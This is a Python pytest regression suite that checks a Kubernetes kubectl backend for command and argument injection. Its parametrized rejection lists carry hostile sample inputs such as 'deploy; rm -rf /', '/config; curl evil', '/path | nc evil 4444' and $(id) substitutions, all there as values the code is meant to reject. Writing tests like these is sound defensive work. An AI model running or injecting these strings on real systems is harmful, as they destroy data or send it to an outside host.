"""Regression tests for k8s_backend command/argument injection.

These tests verify that user-supplied fields in K8sTarget cannot inject
arbitrary shell arguments through kubectl commands, and that all values are
validated at construction time.
"""

from __future__ import annotations

import pytest
from unittest.mock import MagicMock, patch

from cli_anything.espresense.core import k8s_backend


# ── K8sTarget validation ─────────────────────────────────────────────────────

class TestK8sTargetValidation:
    """Untrusted fields must be rejected at construction, not at call time."""

    def test_defaults_are_valid(self):
        t = k8s_backend.K8sTarget()
        assert t.namespace == "espresense"
        assert t.deployment == "espresense-companion"
        assert t.container == "espresense-companion"
        assert t.config_path == "/config/espresense/config.yaml"

    @pytest.mark.parametrize(
        "field,value",
        [
            # Command separators / shell injection
            ("namespace", "ns;sleep 10"),
            ("namespace", "ns && id"),
            ("namespace", "ns | cat"),
            ("namespace", "ns\n"),
            ("deployment", "deploy$(id)"),
            ("deployment", "deploy`id`"),
            ("deployment", "deploy; rm -rf /"),
            ("deployment", "deploy|cat"),
            ("deployment", "deploy&sleep 10"),
            ("container", "ctr$(whoami)"),
            ("container", "ctr`id`"),
            ("container", "ctr;sleep 10"),
            # Path traversal / file injection via config_path
            ("config_path", "/config; curl evil"),
            ("config_path", "/config && id"),
            ("config_path", "/config\nexit 1\n"),
            ("config_path", "/config/path with spaces/file"),
            ("config_path", "/config/path\x00null"),
            # Double-quote / dollar injection in all fields
            ("namespace", 'ns"$(id)"'),
            ("deployment", 'deploy"$(id)"'),
            ("container", 'ctr"$(id)"'),
            ("config_path", '/config"$(id)"'),
        ],
    )
    def test_rejects_shell_metacharacters(self, field, value):
        with pytest.raises(ValueError, match=r"contains unsafe characters"):
            k8s_backend.K8sTarget(**{field: value})

    @pytest.mark.parametrize(
        "field,value",
        [
            # Valid Kubernetes names: alphanumeric, hyphens, underscores, dots, slashes
            ("namespace", "default"),
            ("namespace", "my-ns"),
            ("namespace", "my_ns"),
            ("namespace", "my.ns"),
            ("namespace", "espresense"),
            ("deployment", "my-deploy"),
            ("deployment", "my_deploy"),
            ("deployment", "my.deploy"),
            ("deployment", "espresense-companion"),
            ("container", "my-container"),
            ("container", "my_container"),
            ("container", "espresense-companion"),
            ("config_path", "/path/to/config.yaml"),
            ("config_path", "/path/to/config_file.yml"),
            ("config_path", "/path.with.dots/config"),
            ("config_path", "/config/espresense/config.yaml"),
        ],
    )
    def test_accepts_valid_values(self, field, value):
        t = k8s_backend.K8sTarget(**{field: value})
        assert getattr(t, field) == value


# ── argv is always separate arguments ───────────────────────────────────────

class TestArgvIsolation:
    """All kubectl calls must use a list of arguments, never shell strings."""

    def test_exec_separator_appears_before_argv(self):
        """kubectl '--' separator must precede argv so shell chars are inert."""
        target = k8s_backend.K8sTarget()
        with patch.object(k8s_backend, "_run") as mock_run:
            mock_run.return_value = MagicMock(stdout=b"")
            k8s_backend.exec_(target, ["echo", "hello world"], check=False)
            args_list = mock_run.call_args[0][0]
            dash_idx = args_list.index("--")
            assert args_list[dash_idx + 1 :] == ["echo", "hello world"]

    def test_read_config_one_element_per_arg(self):
        """config_path passed as exactly one list element, not interpolated."""
        target = k8s_backend.K8sTarget(config_path="/safe/path/config.yaml")
        with patch.object(k8s_backend, "exec_") as mock_exec:
            mock_exec.return_value = MagicMock(stdout=b"data: test")
            k8s_backend.read_config(target)
            argv = mock_exec.call_args[0][1]
            # argv is ["cat", <config_path>]; config_path must be a single element
            assert argv == ["cat", "/safe/path/config.yaml"]
            assert len(argv) == 2  # not split by spaces

    def test_write_config_dd_of_isolated(self):
        """dd of= uses config_path as a single safe string argument."""
        target = k8s_backend.K8sTarget(config_path="/safe/path/config.yaml")
        with patch.object(k8s_backend, "exec_") as mock_exec:
            ts_proc = MagicMock()
            ts_proc.stdout = b"1234567890\n"
            mock_exec.return_value = ts_proc
            k8s_backend.write_config(target, "yaml: data", backup=False)
            dd_call = next(
                c for c in mock_exec.call_args_list
                if c[0][1][0] == "dd"
            )
            dd_argv = dd_call[0][1]
            of_arg = next(a for a in dd_argv if a.startswith("of="))
            assert of_arg == "of=/safe/path/config.yaml"
            assert ";" not in of_arg  # no embedded shell commands

    def test_backup_cp_path_isolated(self):
        """cp bak_path is a single argument, not a shell-interpolated string."""
        target = k8s_backend.K8sTarget(config_path="/safe/path/config.yaml")
        with patch.object(k8s_backend, "exec_") as mock_exec:
            ts_proc = MagicMock()
            ts_proc.stdout = b"1234567890\n"
            mock_exec.return_value = ts_proc
            k8s_backend.write_config(target, "yaml: data", backup=True)
            cp_calls = [
                c for c in mock_exec.call_args_list
                if c[0][1][0] == "cp"
            ]
            assert len(cp_calls) == 1
            cp_argv = cp_calls[0][0][1]
            bak_path = "/safe/path/config.yaml.1234567890.bak"
            assert bak_path in cp_argv


# ── Timestamp must come from the pod, not the host ───────────────────────────

class TestTimestampSource:
    """Backup timestamps are generated inside the target container."""

    def test_timestamp_generated_by_pod_exec(self):
        """write_config calls `date +%s` inside the container, not subprocess."""
        target = k8s_backend.K8sTarget()
        with patch.object(k8s_backend, "exec_") as mock_exec:
            ts_proc = MagicMock()
            ts_proc.stdout = b"1700000000\n"
            mock_exec.return_value = ts_proc
            k8s_backend.write_config(target, "yaml: data", backup=False)
            first_argv = mock_exec.call_args_list[0][0][1]
            assert first_argv == ["date", "+%s"]

    def test_no_local_subprocess_for_timestamp(self):
        """subprocess.check_output is not used for timestamp generation."""
        target = k8s_backend.K8sTarget()
        with patch.object(k8s_backend, "exec_") as mock_exec:
            with patch.object(k8s_backend.subprocess, "check_output") as mock_subproc:
                ts_proc = MagicMock()
                ts_proc.stdout = b"1700000000\n"
                mock_exec.return_value = ts_proc
                k8s_backend.write_config(target, "yaml: data", backup=False)
                mock_subproc.assert_not_called()


# ── _run uses a list, not shell=True ────────────────────────────────────────

class TestRunListArgument:
    """_run must always use list-based subprocess calls, never shell=True."""

    def test_run_passes_list_to_subprocess_run(self):
        """subprocess.run must receive args as a list, never a joined string."""
        with patch.object(k8s_backend, "_kubectl", return_value="/bin/kubectl"):
            with patch.object(k8s_backend.subprocess, "run") as mock_run:
                mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")
                k8s_backend._run(["get", "pods"])
                call_kwargs = mock_run.call_args[1]
                # Must NOT use shell=True
                assert call_kwargs.get("shell", False) is not False or "shell" not in call_kwargs
                # args must be a list
                args = mock_run.call_args[0][0] if mock_run.call_args[0] else None
                assert isinstance(args, list)


# ── rollout_status timeout validation ────────────────────────────────────────

class TestRolloutStatusTimeoutValidation:
    """The timeout parameter in rollout_status must be validated before it
    reaches a kubectl invocation to prevent argument injection."""

    @pytest.mark.parametrize(
        "timeout",
        [
            # Valid kubectl timeout values
            "120s",
            "0s",
            "5m",
            "1h",
            "30",
            "999s",
        ],
    )
    def test_accepts_valid_timeout(self, timeout):
        """Valid timeout values must be accepted and reach _run."""
        target = k8s_backend.K8sTarget()
        with patch.object(k8s_backend, "_run") as mock_run:
            mock_run.return_value = MagicMock(
                returncode=0, stdout="ok", stderr=""
            )
            k8s_backend.rollout_status(target, timeout=timeout)
            # The timeout must appear as a single, safe argument
            timeout_arg = next(
                a for a in mock_run.call_args[0][0] if a.startswith("--timeout=")
            )
            assert timeout_arg == f"--timeout={timeout}"

    @pytest.mark.parametrize(
        "timeout",
        [
            # Argument injection via extra flags
            "120s --kubeconfig=/tmp/evil",
            "120s --namespace=attacker",
            # Shell metacharacters
            "120s; rm -rf /",
            "120s && id",
            "120s | cat",
            "120s$(id)",
            "120s`id`",
            # Newline injection
            "120s\n--namespace=evil",
            # Null byte
            "120s\x00evil",
            # Empty / whitespace
            "",
            " ",
            # Non-numeric
            "abc",
            "12.5s",
            "-1s",
        ],
    )
    def test_rejects_unsafe_timeout(self, timeout):
        """Unsafe timeout values must raise ValueError before _run is called."""
        target = k8s_backend.K8sTarget()
        with patch.object(k8s_backend, "_run") as mock_run:
            with pytest.raises(ValueError, match=r"contains unsafe characters"):
                k8s_backend.rollout_status(target, timeout=timeout)
            mock_run.assert_not_called()

    def test_default_timeout_is_valid(self):
        """The default timeout value must pass validation."""
        target = k8s_backend.K8sTarget()
        with patch.object(k8s_backend, "_run") as mock_run:
            mock_run.return_value = MagicMock(
                returncode=0, stdout="ok", stderr=""
            )
            k8s_backend.rollout_status(target)
            timeout_arg = next(
                a for a in mock_run.call_args[0][0] if a.startswith("--timeout=")
            )
            assert timeout_arg == "--timeout=120s"


# ── exec_ argv token validation ──────────────────────────────────────────────

class TestExecArgvValidation:
    """Every element of the argv list passed to exec_ must be validated
    before it reaches a kubectl invocation so that no user-supplied token
    can inject shell metacharacters or extra kubectl flags."""

    @pytest.mark.parametrize(
        "argv",
        [
            # Shell command separators
            ["cat", "/path; rm -rf /"],
            ["cat", "/path && id"],
            ["cat", "/path | nc evil 4444"],
            ["cat", "/path || true"],
            # Command substitution
            ["cat", "$(id)"],
            ["cat", "`whoami`"],
            # Redirects
            ["cat", "/path > /tmp/evil"],
            ["cat", "/path < /dev/null"],
            # Background / job control
            ["cat", "/path &"],
            ["cat", "/path&sleep 10"],
            # Newlines / null bytes
            ["cat", "/path\nrm -rf /"],
            ["cat", "/path\x00evil"],
            # Quotes that could confuse downstream parsing
            ["cat", '/path"$(id)"'],
            ["cat", "/path'$(id)'"],

        ],
    )
    def test_rejects_unsafe_argv_tokens(self, argv):
        target = k8s_backend.K8sTarget()
        with patch.object(k8s_backend, "_run") as mock_run:
            with pytest.raises(ValueError, match=r"contains unsafe characters"):
                k8s_backend.exec_(target, argv, check=False)
            mock_run.assert_not_called()

    def test_rejects_empty_argv(self):
        target = k8s_backend.K8sTarget()
        with patch.object(k8s_backend, "_run") as mock_run:
            with pytest.raises(ValueError, match=r"must be a non-empty list"):
                k8s_backend.exec_(target, [], check=False)
            mock_run.assert_not_called()

    def test_rejects_non_string_argv_element(self):
        target = k8s_backend.K8sTarget()
        with patch.object(k8s_backend, "_run") as mock_run:
            with pytest.raises(ValueError, match=r"contains unsafe characters"):
                k8s_backend.exec_(target, ["cat", 123], check=False)
            mock_run.assert_not_called()

    @pytest.mark.parametrize(
        "argv",
        [
            ["cat", "/config/espresense/config.yaml"],
            ["date", "+%s"],
            ["dd", "of=/config/espresense/config.yaml"],
            ["cp", "/config/espresense/config.yaml", "/config/espresense/config.yaml.123.bak"],
            ["echo", "hello world"],
            ["sh", "-c", "echo safe"],
        ],
    )
    def test_accepts_safe_argv(self, argv):
        target = k8s_backend.K8sTarget()
        with patch.object(k8s_backend, "_run") as mock_run:
            mock_run.return_value = MagicMock(stdout=b"", returncode=0)
            k8s_backend.exec_(target, argv, check=False)
            args_list = mock_run.call_args[0][0]
            dash_idx = args_list.index("--")
            assert args_list[dash_idx + 1:] == argv

    def test_validated_argv_reaches_kubectl_intact(self):
        """After validation, the safe argv must be passed through unchanged."""
        target = k8s_backend.K8sTarget()
        argv = ["cat", "/config/espresense/config.yaml"]
        with patch.object(k8s_backend, "_run") as mock_run:
            mock_run.return_value = MagicMock(stdout=b"", returncode=0)
            k8s_backend.exec_(target, argv, check=False)
            args_list = mock_run.call_args[0][0]
            assert "--" in args_list
            assert args_list[-2:] == argv


# ── _run error message uses shlex.join, not naive join ───────────────────────

class TestRunErrorMessage:
    """The _run failure message must use shlex.join (safe quoting) rather
    than a naive ' '.join that could ambiguously reconstruct a shell
    string from the argument list."""

    def test_error_message_uses_shlex_join(self):
        with patch.object(k8s_backend, "_kubectl", return_value="/bin/kubectl"):
            with patch.object(k8s_backend.subprocess, "run") as mock_run:
                mock_run.return_value = MagicMock(
                    returncode=1, stdout="", stderr="boom"
                )
                with pytest.raises(RuntimeError) as exc_info:
                    k8s_backend._run(
                        ["get", "pods", "-n", "test ns"],
                        check=True,
                    )
                msg = str(exc_info.value)
                # shlex.join quotes tokens with spaces; naive join would not
                assert "'test ns'" in msg or "test\\ ns" in msg

    def test_error_message_does_not_use_naive_space_join(self):
        """Ensure ' '.join is not used — shlex.join produces quoted output."""
        with patch.object(k8s_backend, "_kubectl", return_value="/bin/kubectl"):
            with patch.object(k8s_backend.subprocess, "run") as mock_run:
                mock_run.return_value = MagicMock(
                    returncode=1, stdout="", stderr="err"
                )
                with pytest.raises(RuntimeError) as exc_info:
                    k8s_backend._run(["rollout", "status", "deploy/x"], check=True)
                msg = str(exc_info.value)
                # With shlex.join, the command portion is quoted/escaped
                # and never a raw space-joined string without quoting
                assert "kubectl" in msg
                assert "failed" in msg


# ── write_config bak_path defense-in-depth ──────────────────────────────────

class TestWriteConfigBakPathValidation:
    """The derived bak_path in write_config must be validated even though
    it is built from already-validated components (defense in depth)."""

    def test_bak_path_is_validated(self):
        target = k8s_backend.K8sTarget(config_path="/safe/config.yaml")
        with patch.object(k8s_backend, "exec_") as mock_exec:
            ts_proc = MagicMock()
            ts_proc.stdout = b"1234567890\n"
            mock_exec.return_value = ts_proc
            k8s_backend.write_config(target, "yaml: data", backup=True)
            # The backup cp call must use a validated bak_path
            cp_call = [
                c for c in mock_exec.call_args_list
                if c[0][1] and c[0][1][0] == "cp"
            ]
            assert cp_call, "expected a cp backup call"
            bak_arg = cp_call[0][0][1][2]
            assert bak_arg == "/safe/config.yaml.1234567890.bak"
            # bak_path must match the safe path pattern
            assert k8s_backend._VALID_PATH_RE.match(bak_arg)
